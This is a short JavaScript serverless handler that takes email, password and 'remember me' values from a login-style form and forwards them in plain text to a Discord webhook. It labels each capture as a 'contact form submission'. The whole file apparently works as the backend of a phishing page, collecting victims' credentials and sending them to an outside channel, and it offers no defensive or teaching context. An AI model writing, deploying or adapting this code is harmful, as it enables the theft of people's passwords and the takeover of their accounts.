export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password, remember } = req.body || {};

    const safeEmail = String(email || '').trim();
    const safePassword = String(password || '').trim();
    const safeRemember = remember ? 'Yes' : 'No';

    if (!safeEmail || !safePassword) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
      return res.status(500).json({ error: 'Server misconfigured' });
    }

    const payload = {
      content: '**New contact form submission**',
      embeds: [
        {
          title: 'Contact Form',
          fields: [
            { name: 'Email', value: safeEmail, inline: true },
            { name: 'password', value: safePassword, inline: true },
            { name: 'Remember Me', value: safeRemember, inline: true }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    const r = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!r.ok) {
      const text = await r.text();
      return res.status(502).json({ error: 'Webhook failed', details: text });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
